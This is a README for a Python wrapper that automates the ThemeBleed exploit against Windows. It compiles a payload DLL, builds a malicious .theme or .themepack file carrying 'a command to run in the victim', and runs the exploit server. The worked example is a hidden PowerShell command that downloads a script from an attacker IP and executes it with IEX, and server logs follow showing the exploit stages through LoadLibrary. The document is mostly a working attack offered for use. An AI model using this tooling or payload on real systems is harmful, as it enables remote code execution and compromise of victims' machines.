# ThemeBleed

Created a laaazzyy python wrapper to simplify the process of generating a DLL for the exploit. This tool eliminates the need for a Windows machine with Visual Studio to compile the DLL. The exploit code its preserved and all the credits goes to the original author.

The source code for the DLL is located in the `stage3.cpp` file. The wrapper streamlines the process by replacing the `[command]` placeholder with whatever you want to run in the sytem, compiling the code, relocating the compiled DLL to the data folder of the exploit, and using `ThemeBleed.exe` to create either a .theme file (via generate_theme) or a .themepack file (via generate_themepack).

For testing the generated stage3 DLL, you can refer to the instructions provided at https://blog.didierstevens.com/2017/09/08/quickpost-dlldemo/.

The `run_server` option will just call `wine ThemeBleed.exe server`.

Please be aware that this wrapper relies on the presence of the `wine` and `x86_64-w64-mingw32-gcc` tools to function effectively. 

It has been tested only on a Kali Linux box.

Usage of the python wrapper:
```
Usage: python themebleed.py <command> [<host> <output_path> <command_to_run>]

Commands:
generate_theme		 - Generate a theme file and DLL with a command to run in the victim
generate_themepack	 - Generate a themepack file and DLL with a command to run in the victim
run_server		 - Run the ThemeBleed server
```

Example of a ps1 script download and run:
```
$ python3 themebleed.py generate_theme 10.10.14.77 xpl.theme "powershell -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.77/caos.ps1'); Invoke-Expression caos.ps1\""
stage3 compiled and moved to data folder.
Theme file: xpl.theme created

$ python3 themebleed.py run_server
Server started
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary
```
